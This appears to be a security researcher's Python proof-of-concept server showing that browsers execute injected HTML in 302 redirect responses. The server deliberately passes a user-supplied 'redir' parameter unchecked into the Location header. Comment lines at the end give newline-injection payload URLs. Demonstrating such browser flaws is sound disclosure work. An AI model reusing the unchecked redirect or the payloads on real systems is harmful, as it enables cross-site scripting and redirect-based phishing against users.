#!/usr/bin/env python3
"""
Very simple HTTP server to demonstrate XSS execution in Firefox in 302
redirects.

Author: Quentin Kaiser <quentin@gremwell.com>
"""
from http.server import BaseHTTPRequestHandler, HTTPServer
import logging
from urllib.parse import parse_qsl

class S(BaseHTTPRequestHandler):

    def do_GET(self):
        logging.info("GET request,\nPath: %s\nHeaders:\n%s\n", str(self.path), str(self.headers))
        redir = "https://google.com/"
        if "?" in self.path:
            for key,value in dict(parse_qsl(self.path.split("?")[1], True)).items():
                if key == "redir":
                    redir = value

        self.send_response(302)
        self.send_header('Content-type', 'text/html')
        self.send_header('Location', redir)
        self.end_headers()


def run(server_class=HTTPServer, handler_class=S, port=8000):
    logging.basicConfig(level=logging.INFO)
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    logging.info('Starting httpd...\n')
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    httpd.server_close()
    logging.info('Stopping httpd...\n')

if __name__ == "__main__":
    run()

#poc localhost:8000/%0a%0a<b>aaa  Chrome with empty redirection
#poc localhost:8000/ws://aaa.com%0a%0a<b>aaaa with ws:// firefox
